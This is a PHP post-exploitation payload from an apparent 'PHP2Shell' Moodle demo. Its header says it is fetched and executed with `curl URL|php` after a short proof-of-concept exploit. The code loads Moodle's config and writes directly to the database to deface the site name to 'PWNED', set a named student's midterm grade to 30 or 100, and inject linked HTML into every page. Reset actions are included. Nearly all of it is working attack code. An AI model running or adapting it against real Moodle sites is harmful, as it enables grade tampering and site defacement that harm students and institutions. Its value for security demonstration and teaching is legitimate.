<?php
// Single instructor payload for the PHP2Shell Moodle demo.
//
// The action is read from /loot/action (or argv[1]) so the controller can
// deliver this file over a short URL and execute it with `curl URL|php`
// without passing a long argument through the 14-byte PoC.
//
// Actions:
//   homepage
//   reset-homepage
//   grade 30
//   grade 100
//   rickroll
//   reset-rickroll
//
// This file is a demo payload, not a web endpoint. It reads the local Moodle
// config and only touches the fictional course, grade, and front-page values.

define('CLI_SCRIPT', true);
require('/var/www/html/config.php');
require_once($CFG->dirroot . '/course/lib.php');
require_once($CFG->dirroot . '/user/lib.php');
require_once($CFG->libdir . '/enrollib.php');
require_once($CFG->libdir . '/gradelib.php');
require_once($CFG->libdir . '/grade/grade_item.php');
require_once($CFG->libdir . '/grade/grade_grade.php');

$action = $argv[1] ?? '';
if ($action === '' && is_readable('/loot/action')) {
    $action = trim((string) file_get_contents('/loot/action'));
}
$action = preg_replace('/\s+/', ' ', $action);
$imageUrl = 'https://s.xn--kst.tw/good-hacker.webp';
if (is_readable('/loot/image-url')) {
    $candidate = trim((string) file_get_contents('/loot/image-url'));
    if (preg_match('#^https://#', $candidate)) {
        $imageUrl = $candidate;
    }
}
$imageUrlSafe = htmlspecialchars($imageUrl, ENT_QUOTES, 'UTF-8');
$proof = function (string $text): void {
    file_put_contents('/loot/demo-proof.txt', $text . "\n");
    echo $text . "\n";
};
$fail = function (string $reason) use ($proof): void {
    $proof('demo=failed reason=' . preg_replace('/\s+/', ' ', $reason));
    exit(1);
};

try {
    switch ($action) {
        case 'homepage':
            $site = $DB->get_record('course', ['id' => 1], '*', MUST_EXIST);
            if (!get_config('core', 'lab_demo_homepage_saved')) {
                set_config('lab_demo_homepage_fullname', $site->fullname);
                set_config('lab_demo_homepage_shortname', $site->shortname);
                set_config('lab_demo_homepage_saved', 1);
            }
            $site->fullname = 'PWNED by PHP2Shell';
            $site->shortname = 'PWNED';
            $DB->update_record('course', $site);
            purge_caches();
            $check = $DB->get_record('course', ['id' => 1], '*', MUST_EXIST);
            if ($check->fullname !== 'PWNED by PHP2Shell') {
                $fail('homepage readback mismatch');
            }
            $proof('homepage=ok fullname=PWNED by PHP2Shell shortname=PWNED db=verified');
            break;

        case 'reset-homepage':
            $fullname = get_config('core', 'lab_demo_homepage_fullname');
            $shortname = get_config('core', 'lab_demo_homepage_shortname');
            $fullname = $fullname ?: 'NCKU Moodle';
            $shortname = $shortname ?: 'NCKU Moodle';
            $site = $DB->get_record('course', ['id' => 1], '*', MUST_EXIST);
            $site->fullname = $fullname;
            $site->shortname = $shortname;
            $DB->update_record('course', $site);
            unset_config('lab_demo_homepage_fullname');
            unset_config('lab_demo_homepage_shortname');
            unset_config('lab_demo_homepage_saved');
            purge_caches();
            $check = $DB->get_record('course', ['id' => 1], '*', MUST_EXIST);
            if ($check->fullname !== $fullname || $check->shortname !== $shortname) {
                $fail('homepage reset readback mismatch');
            }
            $proof("homepage-reset=ok fullname={$fullname} shortname={$shortname} db=verified");
            break;

        case 'grade 30':
        case 'grade 100':
            $value = $action === 'grade 30' ? 30.0 : 100.0;
            $course = $DB->get_record('course', ['shortname' => 'OS'], '*', MUST_EXIST);
            $user = $DB->get_record('user', ['username' => 'p2s_student', 'deleted' => 0], '*', MUST_EXIST);
            $item = $DB->get_record('grade_items', [
                'courseid' => $course->id,
                'itemtype' => 'manual',
                'itemname' => 'Midterm',
            ], '*', MUST_EXIST);
            $grade = $DB->get_record('grade_grades', ['itemid' => $item->id, 'userid' => $user->id]);
            if (!$grade) {
                $grade = new grade_grade();
                $grade->itemid = $item->id;
                $grade->userid = $user->id;
                $grade->rawgrade = $value;
                $grade->finalgrade = $value;
                $grade->insert();
            } else {
                $grade->rawgrade = $value;
                $grade->finalgrade = $value;
                $grade->timemodified = time();
                $DB->update_record('grade_grades', $grade);
            }
            grade_regrade_final_grades($course->id);
            $check = $DB->get_record('grade_grades', ['itemid' => $item->id, 'userid' => $user->id], '*', MUST_EXIST);
            if (abs((float) $check->finalgrade - $value) > 0.001) {
                $fail('grade readback mismatch');
            }
            $proof(sprintf(
                'grade=ok course=OS item=Midterm student=p2s_student grade=%.2f db=verified',
                $value
            ));
            break;

        case 'rickroll':
            if (!get_config('core', 'lab_demo_rickroll_top_saved')) {
                $previous = get_config('core', 'additionalhtmltopofbody');
                set_config('lab_demo_rickroll_top_previous', is_string($previous) ? $previous : '');
                set_config('lab_demo_rickroll_top_saved', 1);
            }
            $top = get_config('core', 'additionalhtmltopofbody');
            $top = is_string($top) ? $top : '';
            if (strpos($top, 'good-hacker.webp') !== false && strpos($top, $imageUrl) === false) {
                $fail('legacy local good-hacker image found; reset the old effect first');
            }
            if (strpos($top, $imageUrl) === false) {
                $top .= "\n<div style=\"text-align:center;margin:14px 0;\"><a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" target=\"_blank\" rel=\"noopener\"><img src=\"{$imageUrlSafe}\" alt=\"Good hacker\" style=\"max-width:420px;width:100%;height:auto;border:0;border-radius:6px;\"></a></div>";
            }
            set_config('additionalhtmltopofbody', $top);
            purge_caches();
            $check = get_config('core', 'additionalhtmltopofbody');
            if (!is_string($check)
                || strpos($check, $imageUrl) === false
                || strpos($check, 'youtube.com/watch?v=dQw4w9WgXcQ') === false) {
                $fail('front-page image or link readback mismatch');
            }
            $proof('rickroll=ok image=' . $imageUrl . ' link=youtube db=verified');
            break;

        case 'reset-rickroll':
            if (!get_config('core', 'lab_demo_rickroll_top_saved')) {
                $current = get_config('core', 'additionalhtmltopofbody');
                $fileleft = file_exists('/var/www/html/good-hacker.webp');
                $linkleft = is_string($current) && strpos($current, 'good-hacker.webp') !== false;
                if (!$fileleft && !$linkleft) {
                    $proof('rickroll-reset=ok image=absent link=absent top=already-baseline db=verified');
                    break;
                }
                $fail('no saved top-of-page HTML, but the image/link is still present');
            }
            $previous = get_config('core', 'lab_demo_rickroll_top_previous');
            set_config('additionalhtmltopofbody', is_string($previous) ? $previous : '');
            unset_config('lab_demo_rickroll_top_previous');
            unset_config('lab_demo_rickroll_top_saved');
            @unlink('/var/www/html/good-hacker.webp');
            purge_caches();
            $check = get_config('core', 'additionalhtmltopofbody');
            if (is_string($check) && strpos($check, 'good-hacker.webp') !== false) {
                $fail('front-page image link still present');
            }
            $proof('rickroll-reset=ok image=absent link=absent top=restored db=verified');
            break;

        default:
            $fail('unknown action; use homepage, reset-homepage, grade 30, grade 100, rickroll, or reset-rickroll');
    }
} catch (Throwable $e) {
    $fail($e->getMessage());
}
